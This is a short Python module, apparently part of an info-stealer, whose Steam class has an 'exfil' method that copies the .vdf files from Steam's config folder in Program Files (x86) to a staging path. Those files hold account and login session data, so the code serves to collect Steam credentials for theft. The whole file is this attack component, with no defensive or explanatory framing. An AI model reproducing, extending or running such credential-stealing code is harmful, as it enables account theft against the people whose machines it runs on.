from utils.dircopy import DirCopy

import os


PROG_FILES_X86 = os.getenv('programfiles(x86)')

COPY_FILES = DirCopy.copy_files_from_dir


class Steam:

    def exfil(path):

        COPY_FILES(os.path.join(PROG_FILES_X86 , 'Steam' , 'config') , path , 'vdf' , None)